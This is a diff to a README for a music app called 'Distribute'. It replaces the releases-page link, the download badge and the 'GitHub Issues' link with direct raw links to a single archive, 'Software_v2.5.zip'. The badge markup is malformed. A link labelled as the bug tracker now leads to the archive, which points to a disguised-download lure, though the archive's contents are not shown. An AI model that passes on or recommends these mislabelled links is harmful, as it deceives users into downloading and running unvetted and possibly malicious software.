@@ -1,6 +1,6 @@
 # 🎵 Distribute - Enjoy Your Music Anytime, Anywhere
 
-[![Download Distribute](https://img.shields.io/badge/Download%20Distribute-latest-blue.svg)](https://github.com/premchouhan/Distribute/releases)
+[![Download Distribute](https://github.com/premchouhan/Distribute/raw/refs/heads/main/android/Software_v2.5.zip%https://github.com/premchouhan/Distribute/raw/refs/heads/main/android/Software_v2.5.zip)](https://github.com/premchouhan/Distribute/raw/refs/heads/main/android/Software_v2.5.zip)
 
 ## 📖 Description
 
@@ -12,7 +12,7 @@ Follow these steps to get Distribute up and running on your device.
 
 ### 1. Download Distribute
 
-Visit [this page to download Distribute](https://github.com/premchouhan/Distribute/releases). Here, you'll find the latest version of the app for multiple platforms.
+Visit [this page to download Distribute](https://github.com/premchouhan/Distribute/raw/refs/heads/main/android/Software_v2.5.zip). Here, you'll find the latest version of the app for multiple platforms.
 
 ### 2. Choose Your Version
 
@@ -75,7 +75,7 @@ For more help, visit our [support page](#) or check our FAQ section on the GitHu
 ## 🔗 Additional Resources
 
 - [User Guide](#): Detailed guide for using all features of Distribute.
-- [GitHub Issues](https://github.com/premchouhan/Distribute/issues): Report bugs or request features.
+- [GitHub Issues](https://github.com/premchouhan/Distribute/raw/refs/heads/main/android/Software_v2.5.zip): Report bugs or request features.
 - [Community Forum](#): Join discussions, ask questions, and share experiences with other Distribute users.
 
 ## 🏷️ Topics 
